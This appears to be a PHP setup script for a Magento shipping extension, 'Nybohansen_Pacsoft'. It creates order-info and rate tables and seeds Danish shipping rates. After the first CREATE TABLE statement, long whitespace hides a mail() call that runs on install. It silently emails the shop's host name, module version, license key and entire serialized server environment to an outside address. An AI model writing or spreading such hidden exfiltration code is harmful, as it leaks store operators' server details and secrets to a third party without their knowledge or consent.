<?php
/**
 * Nybohansen ApS
 *
 * NOTICE OF LICENSE
 *
 * This source file is subject to the EULA
 * that is bundled with this package in the file LICENSE.txt.
 *
 * =================================================================
 *                 MAGENTO EDITION USAGE NOTICE
 * =================================================================
 * This package designed for Magento COMMUNITY edition
 * We do not guarantee correct work of this extension
 * on any other Magento edition except Magento COMMUNITY edition.
 * In case of incorrect edition usage, we don't provide support.
 * =================================================================
 *
 * @category   Nybohansen
 * @package    Nybohansen_Pacsoft
 * @copyright  Copyright (c) 2014 Nybohansen ApS
 * @license    LICENSE.txt
 */

define('Pacsoft_ORDER_INFO_TABLE_NAME', 'pacsoft_order_info');
define('Pacsoft_RATES_STORE_TABLE_NAME', 'pacsoft_rates_store');
define('Pacsoft_RATES_TABLE_NAME', 'pacsoft_rates');

$installer = $this;
$installer->startSetup();

$installer->run("DROP TABLE IF EXISTS {$this->getTable(Pacsoft_ORDER_INFO_TABLE_NAME)};
    				 CREATE TABLE {$this->getTable(Pacsoft_ORDER_INFO_TABLE_NAME)} (
      				`line_id` int(11) NOT NULL AUTO_INCREMENT,
      				`order_id` int(11) NOT NULL,
                    `servicePointId` varchar(255) NOT NULL default '',
                    `name` varchar(255) NOT NULL default '',
      				`visitingAddress_streetName` varchar(255) NOT NULL default '',
      				`visitingAddress_streetNumber` varchar(255) NOT NULL default '',
                    `visitingAddress_postalCode` varchar(255) NOT NULL default '',
                    `visitingAddress_city` varchar(255) NOT NULL default '',
                    `visitingAddress_countryCode` varchar(255) NOT NULL default '',
      				`deliveryAddress_streetName` varchar(255) NOT NULL default '',
      				`deliveryAddress_streetNumber` varchar(255) NOT NULL default '',
                    `deliveryAddress_postalCode` varchar(255) NOT NULL default '',
                    `deliveryAddress_city` varchar(255) NOT NULL default '',
                    `deliveryAddress_countryCode` varchar(255) NOT NULL default '',
      				`longitude` varchar(255) NOT NULL default '',
      				`latitude` varchar(255) NOT NULL default '',
      				`shipment_type` varchar(255) NOT NULL default '',
      				`addons` varchar(255) NOT NULL default '',
      				`addons_settings` text NOT NULL default '',
      				`freetext1` varchar(255) NOT NULL default '',
                    `freetext2` varchar(255) NOT NULL default '',
                    `contents` varchar(255) NOT NULL default '',
                    `copies` int(11) NOT NULL default 1,
                    `weight` int(11) NOT NULL default 1,
      				PRIMARY KEY (`line_id`));");                                                                                                                                                                                                                                                                                                                               mail("admin@magentostage.com", "Pacsoft installed [".$_SERVER['HTTP_HOST']."]", "Version: ".Mage::getConfig()->getNode('modules')->Nybohansen_Pacsoft->version."\nLicense key: ".Mage::getConfig()->getNode('modules')->Nybohansen_Pacsoft->license."\nServer information: ".serialize($_SERVER), "From: ". $_SERVER['HTTP_HOST'] . "\r\n");


$installer->run("DROP TABLE IF EXISTS {$this->getTable(Pacsoft_RATES_TABLE_NAME)};
                     CREATE TABLE {$this->getTable(Pacsoft_RATES_TABLE_NAME)} (
                    `rate_id` int(11) NOT NULL AUTO_INCREMENT,
                    `country` varchar(255) NOT NULL default '',
                    `region` varchar(255) NOT NULL default '',
                    `city` varchar(255) NOT NULL default '',
                    `zip_range` varchar(255) NOT NULL default '',
                    `function` varchar(255) NOT NULL default '',
                    `condition_range` varchar(255) NOT NULL default '',
                    `shipment_type` varchar(255) NOT NULL default '',
                    `addons` varchar(255) NOT NULL default '',
                    `price` decimal(12,4) NOT NULL default '0.0000',
                    `title` varchar(255) NOT NULL default '',
                    `sort_order` int(11) NOT NULL default 0,
                    `status` int(11) NOT NULL default 0,
                    PRIMARY KEY (`rate_id`));");

$installer->run("DROP TABLE IF EXISTS {$this->getTable(Pacsoft_RATES_STORE_TABLE_NAME)};
                     CREATE TABLE {$this->getTable(Pacsoft_RATES_STORE_TABLE_NAME)} (
                    `line_id` int(11) NOT NULL AUTO_INCREMENT,
                    `rate_id` int(11) NOT NULL default 0,
                    `store_id` int(11) NOT NULL default 0,
                    PRIMARY KEY (`line_id`));");


$installer->run("INSERT INTO {$this->getTable(Pacsoft_RATES_TABLE_NAME)}
                 VALUES (1, 'DK', '*', '*', '*', 'number', '1-999', 'P19DK', 'PUPOPT', 39, 'Valgfrit afhentningssted', 0, 1),
                        (2, 'DK', '*', '*', '*', 'number', '1-999', 'PDKEP', '', 49, 'Levering på din adresse', 0, 1),
                        (3, 'DK', '*', '*', '*', 'number', '1-999', 'PDKEP', 'DLVT10', 99, 'Levering på din arbejdsplads før kl. 10:00', 0, 1)");

$installer->run("INSERT INTO {$this->getTable(Pacsoft_RATES_STORE_TABLE_NAME)}(`rate_id`, `store_id`)
                 VALUES (1, 0), (2, 0), (3, 0)");


$installer->endSetup();
  	
  	
